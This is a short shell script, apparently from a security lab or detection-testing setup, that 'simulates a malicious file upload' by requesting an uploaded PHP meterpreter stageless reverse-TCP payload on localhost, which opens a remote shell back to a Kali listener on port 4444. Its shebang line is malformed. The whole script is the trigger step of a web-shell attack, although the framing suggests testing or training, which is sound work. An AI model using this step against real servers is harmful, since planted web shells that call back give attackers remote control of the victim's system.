#/bin/sh

echo -e "\e[92mSimulate a malicious file upload, which executes a reverse TCP meterpreter to Kali on port 4444"
echo -e "\e[92mMake sure to have a meterpreter listener running to catch the shell"
curl http://localhost/uploads/php-meterpreter-stageless-reverse-tcp-4444.php &
